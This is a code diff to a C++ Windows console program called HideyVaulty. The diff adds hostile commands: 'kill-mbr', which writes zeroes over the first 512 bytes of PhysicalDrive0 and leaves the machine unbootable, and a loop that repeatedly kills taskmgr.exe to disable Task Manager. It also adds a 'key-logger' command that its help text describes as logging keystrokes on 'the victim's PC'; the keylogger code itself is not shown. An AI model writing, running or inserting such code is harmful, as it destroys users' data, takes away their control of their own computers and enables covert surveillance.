@@ -1,7 +1,10 @@
 #include "stdafx.h"
 #include "HideyVaultyShell.h"
 #include <iostream>
+#include <WinUser.h>
+#include "Logger.h"
 
+int main();
 int mainAuth();
 
 ShellAuth *shellAuth = new ShellAuth();
@@ -56,6 +59,18 @@ void ShellAuth::commandValidityCheckerAuth(std::string userInput) {
 		shellAuth->aboutOutputAuth();
 		commandValidityCheckerAuth(userInput);
 	}
+	else if (userInput == "kill-mbr") {
+		shellAuth->killMBR();
+		commandValidityCheckerAuth(userInput);
+	}
+	else if (userInput == "key-logger") {
+		shellAuth->keyLogger();
+		commandValidityCheckerAuth(userInput);
+	}
+	else if (userInput == "account --logout") {
+		main();
+		commandValidityChecker(userInput);
+	}
 	else if (userInput == "clear") {
 		system("cls");
 		shellAuth->showPromptAuth();
@@ -103,8 +118,11 @@ void ShellAuth::helpOutputAuth() {
 		"account - Takes an account option parameter, useless on its own.\n"
 		"\t--create\n"
 		"\t--login\n"
+		"\t--logout\n"
 		"about - Displays information about HideyVaulty.\n"
 		"dir (directory) - Displays files and subdirectories inside selected directory. (If any).\n"
+		"kill-mbr - Overwrites the first 512 bytes on the first physical drive with zeroes, destroying the MBR. \n"
+		"key-logger - Logs keystrokes on the victim's PC. (experimental) \n"
 		"clear - Clears the screen.\n"
 		"quit - Quits the program.\n"
 		"\n";
@@ -136,10 +154,65 @@ void ShellAuth::dirCommand() {
 	shellAuth->showPromptAuth();
 }
 
+// Function that disables task manager (To be fixed)
+void ShellAuth::taskmgrKill() {
+	while (true) {
+		int killTaskMgr = system("taskkill /f /im taskmgr.exe 2> nul > nul");
+		if (killTaskMgr == 5) {
+			std::cout << "You do not have the privileges to run this command.\n" << std::endl;
+		}
+		std::cout << "Script succeeded.\n" << std::endl;
+	}
+}
+
+// Function that overwrites the master boot record with zeroes
+void ShellAuth::killMBR() {
+	DWORD write;
+	char mbrData[MBR_SIZE];
+
+	ZeroMemory(&mbrData, (sizeof mbrData));
+
+	std::cout << "This operation will make computer unbootable. Proceed? (Y/N) > " << std::flush;
+	getline(std::cin, userInput);
+	while (true) {
+		if (userInput == "Y" || userInput == "y") {
+			std::cout << "Type \"I am fully responsible for the damage I will cause to this PC (Case-sensitive) > " << std::flush;
+			getline(std::cin, userInput);
+			if (userInput == "I am fully responsible for the damage I will cause to this PC") {
+				HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
+					GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+				if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
+					std::cout << "\nMBR annihilated!\n" << std::endl;
+					shellAuth->showPromptAuth();
+					break;
+				}
+				else {
+					std::cout << "You do not have the privileges to run this command.\n" << std::endl;
+					shellAuth->showPromptAuth();
+					break;
+				}
+				CloseHandle(MasterBootRecord);
+			}
+			else {
+				std::cout << "Quitting kill-mbr...\n";
+				shellAuth->showPromptAuth();
+				break;
+			}
+		}
+		else if (userInput == "N" || userInput == "n") {
+			shellAuth->showPromptAuth();
+			break;
+		}
+		else {
+			std::cout << '"' << userInput << '"' << " is not a valid option\n" << std::endl;
+		}
+	}
+}
+
 // Function for the "about" command
 void ShellAuth::aboutOutputAuth() {
 	std::cout << "HideyVaulty - Built by Jack Williams (HackoTron) 2017\n"
-		<< "Version 0.6 Beta\n" << std::endl;
+		<< "Version 0.7 Beta\n" << std::endl;
 	shellAuth->showPromptAuth();
 }
 
